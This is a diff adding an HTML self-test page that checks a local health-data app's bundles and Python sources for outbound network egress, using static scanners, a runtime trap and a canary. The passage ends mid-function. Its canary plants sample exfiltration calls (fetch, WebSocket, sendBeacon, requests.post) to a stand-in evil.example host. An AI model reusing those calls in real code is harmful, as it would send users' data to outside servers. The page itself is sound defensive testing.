@@ -1,0 +1,525 @@
+<!doctype html>
+<html lang="en"><head>
+<!--
+  no-network.html — Tepna
+  Copyright 2026 Michal Planicka
+  SPDX-License-Identifier: Apache-2.0
+  Licensed under the Apache License, Version 2.0. See LICENSE and NOTICE at the
+  project root, or http://www.apache.org/licenses/LICENSE-2.0
+--><meta charset="utf-8">
+<title>Tepna · No-Network Invariant Gate</title>
+<style>
+  :root{ --bg:#0d1117; --panel:#161b22; --bd:#30363d; --tx:#e6edf3; --mut:#8b949e;
+         --ok:#3fb950; --bad:#f85149; --warn:#d29922; --accent:#58a6ff; --canary:#bc8cff; }
+  *{box-sizing:border-box}
+  body{ margin:0; background:var(--bg); color:var(--tx);
+        font:14px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; padding:28px; }
+  h1{ font:600 20px/1.3 system-ui,sans-serif; margin:0 0 4px; }
+  .sub{ color:var(--mut); font:13px/1.55 system-ui,sans-serif; margin:0 0 20px; max-width:82ch; }
+  h2{ font:600 14px/1.3 system-ui,sans-serif; margin:26px 0 2px; }
+  h2 .mut{ font-weight:400; }
+  table{ border-collapse:collapse; width:100%; margin:10px 0 20px; background:var(--panel);
+         border:1px solid var(--bd); border-radius:8px; overflow:hidden; }
+  th,td{ text-align:left; padding:9px 12px; border-bottom:1px solid var(--bd); vertical-align:top; }
+  th{ color:var(--mut); font:600 12px/1 system-ui,sans-serif; text-transform:uppercase; letter-spacing:.04em; }
+  tr:last-child td{ border-bottom:0; }
+  .ok{ color:var(--ok); } .bad{ color:var(--bad); } .warn{ color:var(--warn); } .mut{ color:var(--mut); }
+  .pill{ display:inline-block; padding:1px 8px; border-radius:999px; font:600 11px/1.6 system-ui,sans-serif; }
+  .pill.ok{ background:rgba(63,185,80,.15); color:var(--ok); }
+  .pill.bad{ background:rgba(248,81,73,.15); color:var(--bad); }
+  .pill.warn{ background:rgba(210,153,34,.15); color:var(--warn); }
+  .pill.canary{ background:rgba(188,140,255,.15); color:var(--canary); }
+  .pill.mut{ background:rgba(139,148,158,.12); color:var(--mut); }
+  #verdict{ font:700 15px/1.3 system-ui,sans-serif; padding:14px 16px; border-radius:10px;
+            border:1px solid var(--bd); background:var(--panel); margin:6px 0 22px; }
+  #verdict .lead{ font-size:22px; }
+  code{ background:#21262d; padding:1px 5px; border-radius:4px; font-size:12.5px; }
+  .snip{ color:var(--tx); background:#21262d; padding:1px 5px; border-radius:4px; font-size:12px;
+         white-space:pre-wrap; word-break:break-all; }
+  .det{ color:var(--mut); font:12px/1.5 system-ui,sans-serif; }
+  pre{ background:var(--panel); border:1px solid var(--bd); border-radius:8px; padding:14px; overflow:auto; font-size:12.5px; }
+  .legend{ display:flex; gap:16px; flex-wrap:wrap; font:12px/1.5 system-ui,sans-serif; color:var(--mut); margin:2px 0 6px; }
+  .canarybox{ border:1px solid rgba(188,140,255,.35); background:rgba(188,140,255,.05); border-radius:10px; padding:2px 14px 12px; }
+  .note{ border-left:3px solid var(--warn); background:rgba(210,153,34,.06); padding:8px 14px; border-radius:0 8px 8px 0; font:12.5px/1.55 system-ui,sans-serif; color:var(--tx); margin:6px 0 14px; }
+  a{ color:var(--accent); }
+</style></head>
+<body>
+<h1>Tepna · No-Network Invariant Gate <span class="mut" style="font:500 13px/1 system-ui">— the privacy analogue of verify-provenance</span></h1>
+<p class="sub">The flagship privacy property: <b>no shipped surface initiates network egress</b> — nothing about
+the user leaves their machine. This promotes CLAUDE.md's "100% local, no CDN" <i>convention</i> into an
+<b>enforced, self-verifying property</b>. <b>Scope</b> = the two web-app surfaces a user actually opens:
+the <b>8 self-contained bundles</b> (from <code>BUILD-MANIFEST.json</code>) <b>and the 2 unbundled
+orchestrators</b> — <code>Data&nbsp;Unifier.html</code> / <code>OverDex.html</code> — whose real code lives in
+loose <code>&lt;script src&gt;</code> modules (adapters, DSPs, <code>signal-orchestrate.js</code>, the app
+JS), each of which is fetched and scanned too. Egress is classified by target <i>origin</i>: a
+<b>remote/absolute-URL</b> target (or a transport-only primitive — <code>XMLHttpRequest</code>,
+<code>WebSocket</code>, <code>EventSource</code>, <code>sendBeacon</code>) is a HARD FAIL; a same-origin /
+relative / <code>data:</code> / <code>blob:</code> load of a bundled asset is allowed and <i>listed</i>; a
+remote <code>&lt;a href&gt;</code> is a user <i>navigation</i>, not egress, and is listed separately.
+<b>Layer 2 (runtime)</b> boots each surface in a trapped iframe whose egress primitives throw on a
+cross-origin target and asserts none fired. <b>Layer 3 (Python — static lens)</b> reads the
+<code>capture-host/</code> sources: a browser gate <i>cannot execute Python</i>, so this is a text lens
+(outbound HTTP client → FAIL; BLE / local file / LAN file-server → allowed) with a CI follow-up noted.
+<b>Negative control</b> plants egress in every lens and asserts the gate catches it (anti-vacuous-pass).
+Verdict: <code>window.__noNetworkOK</code> (+ <code>__staticOK</code>/<code>__runtimeOK</code>/<code>__pythonOK</code>/<code>__canaryOK</code>). Adds no runtime behavior (no re-bundle).</p>
+
+<div id="verdict"><span class="lead">⏳</span> running…</div>
+
+<h2>1 · Static scan <span class="mut">— bundles + orchestrators + their loose modules, origin-classified</span></h2>
+<div class="legend">
+  <span><b style="color:var(--bad)">remote egress</b> = absolute-URL target → FAIL</span>
+  <span><b style="color:var(--bad)">transport primitive</b> = XHR/WebSocket/EventSource/sendBeacon → FAIL</span>
+  <span><b style="color:var(--ok)">local</b> = relative / same-origin / data: / blob: → allowed</span>
+  <span><b style="color:var(--accent)">nav</b> = remote <code>&lt;a href&gt;</code> → user navigation, not egress</span>
+</div>
+<p id="staticSummary" class="sub" style="margin:0 0 8px"></p>
+<table id="staticTbl"><thead><tr><th>Surface</th><th>Kind</th><th>Remote egress</th><th>Loose modules scanned</th><th>Local loads · nav</th></tr></thead><tbody></tbody></table>
+<div id="staticDetail"></div>
+
+<h2>2 · Runtime scan <span class="mut">— booted in a trapped iframe, cross-origin egress throws</span></h2>
+<p id="runtimeSummary" class="sub" style="margin:0 0 8px"></p>
+<table id="runtimeTbl"><thead><tr><th>Surface</th><th>Boot</th><th>Remote egress attempts</th><th>Local loads (allowed)</th></tr></thead><tbody></tbody></table>
+
+<h2>3 · Python surface <span class="mut">— capture-host/ static lens (a browser gate can't execute Python)</span></h2>
+<div class="note"><b>Different execution surface.</b> The bedside capture host runs <b>Python on a Raspberry
+Pi</b> — not in this browser — so this layer is a <b>static text lens</b> only, and is <b>not</b>
+authoritative: the real check belongs in CI (a Python/Node import-allowlist over <code>capture-host/</code>).
+By design the host is <b>BLE-in → disk-out → LAN file-server</b> (Caddy on <code>tepna.local</code>);
+"no egress" here means <b>no outbound internet client</b> (no <code>requests</code>/<code>urllib</code>/
+cloud SDK phoning data out) — serving bundles on the LAN is not egress.</div>
+<p id="pySummary" class="sub" style="margin:0 0 8px"></p>
+<table id="pyTbl"><thead><tr><th>File</th><th>Outbound HTTP client</th><th>Local surface (BLE / file / LAN-serve)</th></tr></thead><tbody></tbody></table>
+
+<h2>4 · Negative control <span class="mut">— the gate must catch planted egress (anti-vacuous-pass)</span></h2>
+<div class="canarybox">
+<p class="sub" style="margin:12px 0 8px">A canary that ships with the gate, exercising every lens. <b>Static:</b> a
+test-only fixture with a real <code>fetch("https://evil.example/x")</code> (+ remote <code>&lt;script src&gt;</code>,
+<code>WebSocket</code>, <code>sendBeacon</code>, <code>@import</code>) the scanner <b>must</b> flag, plus a benign
+local string it must <b>not</b> (and a remote <code>&lt;a href&gt;</code> it must classify as nav, not egress).
+<b>Runtime:</b> a module that attempts one remote <code>fetch</code>/<code>WebSocket</code>/<code>sendBeacon</code>
+against the trap (must throw) + one local fetch (must be allowed). <b>Python:</b> a planted
+<code>requests.post("https://evil.example")</code> the Python lens must flag. Any miss HARD-FAILS the whole gate.</p>
+<p id="canarySummary" class="sub" style="margin:0 0 8px"></p>
+<table id="canaryTbl"><thead><tr><th>Check</th><th>Expectation</th><th>Result</th></tr></thead><tbody></tbody></table>
+</div>
+
+<h2>5 · CI recipe</h2>
+<pre id="ci"></pre>
+
+<script>
+/* ═══════════════════════════════════════════════════════════════════════════
+   NO-NETWORK GATE — self-contained. Scans the two WEB-APP surfaces (the 8
+   self-contained bundles + the 2 unbundled orchestrators and their loose
+   modules) and a STATIC lens over the Python capture-host. All verdict logic
+   lives here and is mirrored by the canary so it cannot rot into a vacuous pass.
+
+   Invariant: "nothing about the user leaves their machine." Egress = a request
+   whose target is a REMOTE origin (any absolute-scheme / protocol-relative URL
+   that doesn't resolve to this origin) OR a transport-only primitive with no
+   local-asset use (XHR/WebSocket/EventSource/sendBeacon). A same-origin /
+   relative / data: / blob: load of a bundled asset does NOT leave the machine.
+   A remote <a href> is a user navigation, not automatic egress.
+   ═══════════════════════════════════════════════════════════════════════════ */
+
+const BUNDLES_FALLBACK = ['ECGDex.html','OxyDex.html','PulseDex.html','GlucoDex.html',
+                          'PpgDex.html','HRVDex.html','CPAPDex.html','Integrator.html'];
+const ORCHESTRATORS = ['Data Unifier.html','OverDex.html'];   // unbundled — loose <script src>, outside BUILD-MANIFEST
+const PY_FILES = ['capture-host/capture.py','capture-host/polar_pmd.py','capture-host/writers.py','capture-host/requirements.txt'];
+
+/* ── URL origin classifier (shared by the static scanner and the runtime trap string) ── */
+function isRemoteURL(u){
+  if(u==null) return false;
+  u = String(u).trim();
+  if(!u) return false;
+  if(/^\/\//.test(u)) return true;                       // protocol-relative → remote
+  if(/^(https?|wss?|ftp):/i.test(u)){
+    try{ return new URL(u, location.href).origin !== location.origin; }
+    catch(_){ return true; }
+  }
+  return false;                                          // relative / data: / blob: / # / same-origin-absolute → local
+}
+
+/* ── The static scanner. Line-by-line so every match carries a file:line + snippet.
+   Returns { remote:[], transport:[], external:[], local:[] }. ── */
+const RESOURCE_REMOTE = /(?:\bsrc|\bhref|\.src|\.href)\s*=\s*["'`]?\s*(https?:\/\/|\/\/|wss?:\/\/|ftp:\/\/)/i;
+const ANCHOR_REMOTE   = /<a\b[^>]*\bhref\s*=\s*["'`]?\s*(https?:\/\/|\/\/)/i;   // a user navigation, not egress
+const CSS_IMPORT_REMOTE = /@import\s+(?:url\(\s*)?["'`]?\s*(https?:\/\/|\/\/)/i;
+const CSS_URL_REMOTE = /url\(\s*["'`]?\s*(https?:\/\/|\/\/)/i;
+const TRANSPORT = /\b(XMLHttpRequest|WebSocket|EventSource|RTCPeerConnection)\b|\bnavigator\s*\.\s*sendBeacon\b|\bsendBeacon\s*\(/;
+
+function firstLiteralArg(argText){
+  const m = /^\s*(['"`])((?:\\.|(?!\1)[^\\])*)\1/.exec(argText);
+  return m ? m[2] : null;
+}
+
+function scanText(text, label){
+  const out = { remote:[], transport:[], external:[], local:[] };
+  const lines = text.split(/\r?\n/);
+  for(let i=0;i<lines.length;i++){
+    const line = lines[i];
+    const ln = i+1;
+    const push = (arr, kind, url) => arr.push({ label, line:ln, kind, url:(url==null?'':String(url)), snippet:line.trim().slice(0,180) });
+
+    // (a) fetch(...) / import(...) — dual-use: classify by the literal argument
+    let m; const call = /\b(fetch|import)\s*\(([^;]*)/g;
+    while((m = call.exec(line))){
+      const kind = m[1]==='fetch' ? 'fetch' : 'import()';
+      const lit = firstLiteralArg(m[2]);
+      if(lit==null){ push(out.local, kind, '(dynamic arg)'); }
+      else if(isRemoteURL(lit)){ push(out.remote, kind, lit); }
+      else { push(out.local, kind, lit || '(empty)'); }
+    }
+    // (b) transport-only primitives — no local-asset use in an offline analyzer
+    if(TRANSPORT.test(line)) push(out.transport, 'transport', (line.match(TRANSPORT)||[''])[0]);
+    // (c) remote <a href> = navigation (NOT egress) — classify first so it isn't counted as a resource
+    if(ANCHOR_REMOTE.test(line)){ push(out.external, 'a-href', (line.match(ANCHOR_REMOTE)||[])[1]||''); }
+    // (d) remote auto-loading resource attribute (script/link/img/iframe src|href, JS .src=)
+    else { let rm; if((rm = RESOURCE_REMOTE.exec(line))) push(out.remote, 'resource', rm[1]); }
+    // (e) remote CSS @import / url() / @font-face src
+    let cm;
+    if((cm = CSS_IMPORT_REMOTE.exec(line))) push(out.remote, '@import', cm[1]);
+    if((cm = CSS_URL_REMOTE.exec(line)))    push(out.remote, 'css url()', cm[1]);
+  }
+  return out;
+}
+
+/* ── Python static lens. Outbound HTTP client → FAIL; BLE / local file / LAN-serve → allowed.
+   NOT authoritative (a browser can't run Python) — a text lens + a CI follow-up. ── */
+const PY_OUTBOUND = /\b(requests\.(?:get|post|put|patch|delete|request|Session)|urllib\.request|urlopen|urllib3|http\.client|httplib|httpx|aiohttp|smtplib|ftplib|boto3|google\.cloud|azure\.|paho\.mqtt|websockets?\.connect|socket\.create_connection)\b/;
+const PY_DEP_OUTBOUND = /^(requests|httpx|aiohttp|urllib3|boto3|google-cloud|azure-|paho-mqtt|websocket-client|websockets|pika|kafka-python)\b/i;
+const PY_SERVE = /\b(http\.server|socketserver|BaseHTTPRequestHandler|Flask|FastAPI|uvicorn|gunicorn|app\.run)\b/;
+const PY_BLE   = /\b(bleak|BleakClient|bluetooth|pydbus|dbus)\b/;
+
+function scanPython(text, label){
+  const out = { egress:[], serve:[], ble:[], dep:[] };
+  const lines = text.split(/\r?\n/);
+  const isReq = /requirements\.txt$/.test(label);
+  for(let i=0;i<lines.length;i++){
+    const line = lines[i], ln = i+1;
+    const rec = (arr, tok) => arr.push({ label, line:ln, token:tok, snippet:line.trim().slice(0,160) });
+    if(isReq){
+      const bare = line.trim();
+      if(bare && !bare.startsWith('#') && PY_DEP_OUTBOUND.test(bare)) rec(out.dep, (bare.match(PY_DEP_OUTBOUND)||[''])[0]);
+      continue;
+    }
+    if(PY_OUTBOUND.test(line)) rec(out.egress, (line.match(PY_OUTBOUND)||[''])[0]);
+    if(PY_SERVE.test(line))    rec(out.serve, (line.match(PY_SERVE)||[''])[0]);
+    if(PY_BLE.test(line))      rec(out.ble, (line.match(PY_BLE)||[''])[0]);
+  }
+  return out;
+}
+
+/* ── Trap injected at the TOP of a booted surface's <head>: wraps egress primitives
+   before any surface script runs; records every attempt, THROWS on a cross-origin target. ── */
+const TRAP_SRC = `(function(){
+  var E = window.__egress = [];
+  function isRemote(u){
+    if(u==null) return false; u=String(u).trim(); if(!u) return false;
+    if(/^\\/\\//.test(u)) return true;
+    if(/^(https?|wss?|ftp):/i.test(u)){ try{ return new URL(u, location.href).origin !== location.origin; }catch(_){ return true; } }
+    return false;
+  }
+  function rec(kind,url,blocked){ E.push({kind:kind,url:String(url),blocked:!!blocked}); }
+  try{ var _f=window.fetch; window.fetch=function(input,init){ var u=(input&&input.url)?input.url:input;
+    if(isRemote(u)){ rec('fetch',u,true); throw new Error('[no-network] blocked remote fetch → '+u); }
+    rec('fetch',u,false); return _f?_f.apply(this,arguments):Promise.reject(new Error('no fetch')); }; }catch(_){}
+  try{ var _o=XMLHttpRequest.prototype.open; XMLHttpRequest.prototype.open=function(method,u){
+    if(isRemote(u)){ rec('xhr',u,true); throw new Error('[no-network] blocked remote XHR → '+u); }
+    rec('xhr',u,false); return _o.apply(this,arguments); }; }catch(_){}
+  try{ var _W=window.WebSocket; window.WebSocket=function(u){
+    if(isRemote(u)){ rec('websocket',u,true); throw new Error('[no-network] blocked WebSocket → '+u); }
+    rec('websocket',u,false); return new _W(u); }; }catch(_){}
+  try{ if(window.EventSource){ var _E=window.EventSource; window.EventSource=function(u){
+    if(isRemote(u)){ rec('eventsource',u,true); throw new Error('[no-network] blocked EventSource → '+u); }
+    rec('eventsource',u,false); return new _E(u); }; } }catch(_){}
+  try{ if(navigator.sendBeacon){ var _b=navigator.sendBeacon.bind(navigator); navigator.sendBeacon=function(u,d){
+    if(isRemote(u)){ rec('sendbeacon',u,true); throw new Error('[no-network] blocked sendBeacon → '+u); }
+    rec('sendbeacon',u,false); return _b(u,d); }; } }catch(_){}
+})();`;
+
+function injectTrap(bundleText){
+  const tag = '<script>'+TRAP_SRC+'<\/script>';
+  if(/<head[^>]*>/i.test(bundleText)) return bundleText.replace(/<head[^>]*>/i, m => m + tag);
+  return tag + bundleText;
+}
+
+/* ── Boot one HTML string in a trapped, sandboxed iframe; resolve __egress[] once settled.
+   An unsettled boot is inconclusive (SKIP), never a false red — static is authoritative. ── */
+function bootTrapped(html, { drive=true, settleMs=900, timeoutMs=9000 } = {}){
+  return new Promise((resolve)=>{
+    const ifr = document.createElement('iframe');
+    ifr.setAttribute('sandbox','allow-scripts allow-same-origin');
+    ifr.style.cssText='position:fixed;left:-9999px;top:-9999px;width:1024px;height:768px;border:0';
+    let done=false;
+    const finish=(status)=>{ if(done) return; done=true;
+      let egress=[]; try{ egress=(ifr.contentWindow&&ifr.contentWindow.__egress)||[]; }catch(_){ egress=null; }
+      try{ ifr.remove(); }catch(_){}
+      resolve({ status, egress }); };
+    const watchdog=setTimeout(()=>finish('timeout'), timeoutMs);
+    ifr.addEventListener('load', ()=>{
+      setTimeout(()=>{
+        if(drive){ try{
+          const d=ifr.contentDocument;
+          const btn=d&&(d.getElementById('demoBtn')||d.getElementById('demo')||d.querySelector('[data-demo],[data-demo-btn]'));
+          if(btn) btn.click();
+        }catch(_){} }
+        setTimeout(()=>{ clearTimeout(watchdog); finish('booted'); }, settleMs);
+      }, 60);
+    });
+    ifr.srcdoc = html;
+    document.body.appendChild(ifr);
+  });
+}
+
+/* ── render helpers ── */
+function elRow(tbody, cells){ const tr=document.createElement('tr'); tr.innerHTML=cells.join(''); tbody.appendChild(tr); return tr; }
+function pill(cls, txt){ return '<span class="pill '+cls+'">'+txt+'</span>'; }
+function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+async function fetchText(path){ try{ const r=await fetch(encodeURI(path)+'?_='+Date.now(), {cache:'no-store'}); return r.ok? await r.text() : null; }catch(_){ return null; } }
+function localScriptSrcs(html){
+  const out=[]; let m;
+  const s=/<script\b[^>]*\bsrc\s*=\s*["']([^"']+)["']/gi;
+  while((m=s.exec(html))){ if(!isRemoteURL(m[1])) out.push(m[1]); }
+  const l=/<link\b[^>]*\bhref\s*=\s*["']([^"']+)["']/gi;
+  while((m=l.exec(html))){ if(/\.css(\?|$)/i.test(m[1]) && !isRemoteURL(m[1])) out.push(m[1]); }
+  return out;
+}
+
+(async function main(){
+  /* bundle list — authoritative from BUILD-MANIFEST.json, fallback to the known 8 */
+  let BUNDLES = BUNDLES_FALLBACK.slice();
+  try{ const t=await fetchText('BUILD-MANIFEST.json'); if(t){ const j=JSON.parse(t); if(j&&j.bundles) BUNDLES=Object.keys(j.bundles); } }catch(_){}
+  const PAGES = BUNDLES.map(b=>({name:b, kind:'bundle', selfContained:true}))
+    .concat(ORCHESTRATORS.map(o=>({name:o, kind:'orchestrator', selfContained:false})));
+
+  /* ─────────────── LAYER 1 — STATIC ─────────────── */
+  const staticTb = document.querySelector('#staticTbl tbody');
+  const detailWrap = document.getElementById('staticDetail');
+  const moduleCache = {};   // path → scan (dedupe shared modules across orchestrators)
+  let staticRemoteTotal=0, staticScanned=0, staticMissing=0, externalTotal=0;
+  const remoteHits=[];
+  for(const pg of PAGES){
+    const html = await fetchText(pg.name);
+    if(html==null){ staticMissing++; elRow(staticTb,['<td>'+esc(pg.name)+'</td>','<td class="mut">'+pg.kind+'</td>','<td>'+pill('warn','not served — skipped')+'</td>','<td class="mut">—</td>','<td class="mut">—</td>']); continue; }
+    staticScanned++;
+    const hs = scanText(html, pg.name);
+    let remote = hs.remote.concat(hs.transport);
+    let ext = hs.external.slice();
+    let localN = hs.local.length;
+    let modNames = [];
+    if(!pg.selfContained){
+      for(const mod of localScriptSrcs(html)){
+        modNames.push(mod);
+        if(!(mod in moduleCache)){
+          const mtxt = await fetchText(mod);
+          moduleCache[mod] = mtxt==null ? null : scanText(mtxt, mod);
+        }
+        const ms = moduleCache[mod];
+        if(ms){ remote = remote.concat(ms.remote, ms.transport); ext = ext.concat(ms.external); localN += ms.local.length; }
+      }
+    }
+    staticRemoteTotal += remote.length;
+    externalTotal += ext.length;
+    remote.forEach(h=>remoteHits.push(h));
+    elRow(staticTb,[
+      '<td>'+esc(pg.name)+'</td>',
+      '<td class="mut">'+pg.kind+'</td>',
+      '<td>'+(remote.length? pill('bad', remote.length+' — FAIL') : pill('ok','0 ✓'))+'</td>',
+      '<td class="mut">'+(pg.selfContained? '<span class="det">inlined (self-contained)</span>' : modNames.length+' <span class="det">'+esc(modNames.slice(0,4).join(', '))+(modNames.length>4?', …':'')+'</span>')+'</td>',
+      '<td class="mut">'+localN+(ext.length? ' · '+pill('mut', ext.length+' nav') : '')+'</td>'
+    ]);
+  }
+  if(remoteHits.length){
+    let html='<h2 class="bad" style="margin-top:6px">Remote-egress hits (each is a HARD FAIL)</h2><table><thead><tr><th>File:line</th><th>Kind</th><th>Target</th><th>Source</th></tr></thead><tbody>';
+    remoteHits.forEach(h=>{ html+='<tr><td class="bad">'+esc(h.label)+':'+h.line+'</td><td>'+esc(h.kind)+'</td><td class="bad">'+esc(h.url)+'</td><td><span class="snip">'+esc(h.snippet)+'</span></td></tr>'; });
+    html+='</tbody></table>'; detailWrap.innerHTML=html;
+  }
+  const uniqueModules = Object.keys(moduleCache).length;
+  const staticOK = staticRemoteTotal===0 && staticScanned>0;
+  document.getElementById('staticSummary').innerHTML =
+    (staticOK ? pill('ok','✓ no remote egress across '+staticScanned+' surface(s) + '+uniqueModules+' loose module(s)')
+              : pill('bad','✗ '+staticRemoteTotal+' remote-egress hit(s)'))
+    + (staticMissing? ' '+pill('warn', staticMissing+' not served — skipped') : '')
+    + (externalTotal? ' '+pill('mut', externalTotal+' external <a> link(s) — navigation, not egress') : '')
+    + ' <span class="det">local/dynamic same-origin loads allowed by design.</span>';
+
+  /* ─────────────── LAYER 2 — RUNTIME ─────────────── */
+  const runTb = document.querySelector('#runtimeTbl tbody');
+  let runtimeRemoteTotal=0, runtimeBooted=0, runtimeSkipped=0;
+  for(const pg of PAGES){
+    const html = await fetchText(pg.name);
+    if(html==null){ runtimeSkipped++; elRow(runTb,['<td>'+esc(pg.name)+'</td>','<td>'+pill('warn','not served')+'</td>','<td class="mut">—</td>','<td class="mut">—</td>']); continue; }
+    const res = await bootTrapped(injectTrap(html));
+    const egress = res.egress || [];
+    const remote = egress.filter(e=>e.blocked), local = egress.filter(e=>!e.blocked);
+    if(res.status==='booted') runtimeBooted++; else runtimeSkipped++;
+    runtimeRemoteTotal += remote.length;
+    const bootPill = res.status==='booted' ? pill('ok','booted ✓') : res.status==='timeout' ? pill('warn','inconclusive — skipped') : pill('warn', esc(res.status));
+    elRow(runTb,[
+      '<td>'+esc(pg.name)+' <span class="det">'+pg.kind+'</span></td>',
+      '<td>'+bootPill+'</td>',
+      '<td>'+(remote.length? pill('bad', remote.length+' BLOCKED — FAIL <span class="det">'+esc(remote.map(r=>r.kind+'→'+r.url).join(', '))+'</span>') : pill('ok','0 ✓'))+'</td>',
+      '<td class="mut">'+local.length+(local.length?' <span class="det">'+esc(local.map(r=>r.kind).join(', '))+'</span>':'')+'</td>'
+    ]);
+  }
+  const runtimeOK = runtimeRemoteTotal===0;
+  document.getElementById('runtimeSummary').innerHTML =
+    (runtimeOK ? pill('ok','✓ no cross-origin egress fired ('+runtimeBooted+' booted)') : pill('bad','✗ '+runtimeRemoteTotal+' cross-origin egress attempt(s) blocked'))
+    + (runtimeSkipped? ' '+pill('warn', runtimeSkipped+' skipped (boot inconclusive / not served) — static layer authoritative') : '');
+
+  /* ─────────────── LAYER 3 — PYTHON (static lens) ─────────────── */
+  const pyTb = document.querySelector('#pyTbl tbody');
+  let pyEgressTotal=0, pyScanned=0, pyMissing=0;
+  for(const f of PY_FILES){
+    const txt = await fetchText(f);
+    if(txt==null){ pyMissing++; elRow(pyTb,['<td>'+esc(f)+'</td>','<td>'+pill('warn','not served — skipped')+'</td>','<td class="mut">—</td>']); continue; }
+    pyScanned++;
+    const s = scanPython(txt, f);
+    const egress = s.egress.concat(s.dep);
+    pyEgressTotal += egress.length;
+    const localBits = s.serve.map(x=>'serve:'+x.token).concat(s.ble.map(x=>'ble:'+x.token));
+    elRow(pyTb,[
+      '<td>'+esc(f)+'</td>',
+      '<td>'+(egress.length? pill('bad', egress.length+' — FAIL <span class="det">'+esc(egress.map(x=>x.token).join(', '))+'</span>') : pill('ok','0 ✓'))+'</td>',
+      '<td class="mut">'+(localBits.length? esc([...new Set(localBits)].join(', ')) : '<span class="det">stdlib / struct / file I/O only</span>')+'</td>'
+    ]);
+  }
+  const pythonOK = pyEgressTotal===0 && pyScanned>0;
+  document.getElementById('pySummary').innerHTML =
+    (pythonOK ? pill('ok','✓ no outbound HTTP client in '+pyScanned+' file(s) — BLE-in / disk-out / LAN-serve')
+              : pill('bad','✗ '+pyEgressTotal+' outbound-client reference(s)'))
+    + (pyMissing? ' '+pill('warn', pyMissing+' not served — skipped') : '')
+    + ' <span class="det">static lens — authoritative Python check belongs in CI.</span>';
+
+  /* ─────────────── NEGATIVE CONTROL (CANARY) ─────────────── */
+  const canTb = document.querySelector('#canaryTbl tbody');
+  let canaryOK = true;
+  const canRow = (name, expect, passed, detail)=>{
+    if(!passed) canaryOK=false;
+    elRow(canTb,['<td>'+esc(name)+'</td>','<td class="det">'+esc(expect)+'</td>','<td>'+(passed? pill('ok','caught ✓'):pill('bad','MISSED ✗'))+(detail?' <span class="det">'+esc(detail)+'</span>':'')+'</td>']);
+  };
+
+  // (1a) STATIC canary — planted egress MUST be flagged
+  const PLANTED = [
+    'fetch("https://evil.example/exfil?d=" + payload);',
+    'var ws = new WebSocket("wss://evil.example/c2");',
+    'navigator.sendBeacon("https://evil.example/beacon", body);',
+    'img.src = "https://evil.example/pixel.gif";',
+    '<script src="https://cdn.evil.example/track.js"><\/script>',
+    '@import url("https://fonts.evil.example/f.css");'
+  ].join('\n');
+  const plantedScan = scanText(PLANTED, 'canary/planted');
+  const plantedHits = plantedScan.remote.length + plantedScan.transport.length;
+  const caughtEvilFetch = plantedScan.remote.some(h=>h.kind==='fetch' && /evil\.example/.test(h.url));
+  canRow('static · planted remote fetch', 'flag fetch("https://evil.example/x")', caughtEvilFetch, caughtEvilFetch?'':'detector did NOT flag the planted fetch');
+  canRow('static · planted egress set', 'flag all ≥5 planted egress lines', plantedHits>=5, plantedHits+' flagged');
+
+  // (1b) STATIC canary — benign local MUST NOT be flagged; remote <a href> = nav, not egress
+  const BENIGN = [
+    "fetch('uploads/O2Ring.csv');",
+    'const r = await fetch(s.src);',
+    "el.src = 'data:image/png;base64,AAAA';",
+    "link.href = './dex-badges.css';",
+    '<a href="https://doi.org/10.1000/x" target="_blank" rel="noopener">cite</a>'
+  ].join('\n');
+  const benignScan = scanText(BENIGN, 'canary/benign');
+  const benignRemote = benignScan.remote.length + benignScan.transport.length;
+  canRow('static · benign local not flagged', '0 remote hits on relative/data: loads', benignRemote===0, benignRemote+' false-positive(s)');
+  canRow('static · remote <a href> = nav', 'classify external link as navigation, not egress', benignScan.external.length===1 && benignScan.remote.length===0);
+
+  // (2) RUNTIME canary — trap must THROW on remote, ALLOW on local
+  const CANARY_MODULE = `<!doctype html><html><head></head><body><script>
+    (async function(){
+      window.__canary = { blocked:[], allowed:[], errors:[] };
+      function attempt(kind, fn){ try{ var p = fn(); if(p && p.catch) p.catch(function(){}); window.__canary.allowed.push(kind); }
+        catch(e){ if(/no-network/.test(e.message)) window.__canary.blocked.push(kind); else window.__canary.errors.push(kind+': '+e.message); } }
+      attempt('remote-fetch', function(){ return window.fetch('https://evil.example/x'); });
+      attempt('remote-ws',    function(){ return new window.WebSocket('wss://evil.example/c2'); });
+      attempt('remote-beacon',function(){ return navigator.sendBeacon('https://evil.example/b','d'); });
+      attempt('local-fetch',  function(){ return window.fetch('no-network-canary-local-probe.json'); });
+    })();
+  <\/script></body></html>`;
+  const cc = await readCanary(CANARY_MODULE);
+  const blockedSet = new Set((cc&&cc.blocked)||[]);
+  const allowedSet = new Set((cc&&cc.allowed)||[]);
+  canRow('runtime · remote fetch blocked', 'trap throws on https://evil.example', blockedSet.has('remote-fetch'));
+  canRow('runtime · remote WebSocket blocked', 'trap throws on wss://evil.example', blockedSet.has('remote-ws'));
+  canRow('runtime · remote sendBeacon blocked', 'trap throws on https://evil.example', blockedSet.has('remote-beacon'));
+  canRow('runtime · local fetch allowed', 'same-origin fetch NOT thrown', allowedSet.has('local-fetch'), 'trap must discriminate, not block-all');
+
+  // (3) PYTHON canary — planted outbound client MUST be flagged
+  const PY_PLANTED = 'import requests\nrequests.post("https://evil.example/exfil", json=payload)\nurllib.request.urlopen("http://evil.example")';
+  const pyScan = scanPython(PY_PLANTED, 'canary/planted.py');
+  canRow('python · planted requests.post', 'flag an outbound HTTP client call', pyScan.egress.length>=1, pyScan.egress.length+' flagged');
+  const PY_BENIGN = 'from bleak import BleakClient\nimport http.server\nwr.write(row)';
+  const pyBenign = scanPython(PY_BENIGN, 'canary/benign.py');
+  canRow('python · BLE/serve not flagged', 'bleak + http.server = local, 0 egress', pyBenign.egress.length===0, pyBenign.egress.length+' false-positive(s)');
+
+  document.getElementById('canarySummary').innerHTML = canaryOK
+    ? pill('canary','✓ negative control passed — every lens has teeth')
+    : pill('bad','✗ NEGATIVE CONTROL FAILED — the gate is not trustworthy (vacuous)');
+
+  /* ─────────────── VERDICT ─────────────── */
+  const ok = staticOK && runtimeOK && pythonOK && canaryOK;
+  window.__staticOK = staticOK; window.__runtimeOK = runtimeOK; window.__pythonOK = pythonOK; window.__canaryOK = canaryOK;
+  window.__noNetworkOK = !!ok;
+  window.noNetworkStatus = function(){ return {
+    ok: window.__noNetworkOK, static: staticOK, runtime: runtimeOK, python: pythonOK, canary: canaryOK,
